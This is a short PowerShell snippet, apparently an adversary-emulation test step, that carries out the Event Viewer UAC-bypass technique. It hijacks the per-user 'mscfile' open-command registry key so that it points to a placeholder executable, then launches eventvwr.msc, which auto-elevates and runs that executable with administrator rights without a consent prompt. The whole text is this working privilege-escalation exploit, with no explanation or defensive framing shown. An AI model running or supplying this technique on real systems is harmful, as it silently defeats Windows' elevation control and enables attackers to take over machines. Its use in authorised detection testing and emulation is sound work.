New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"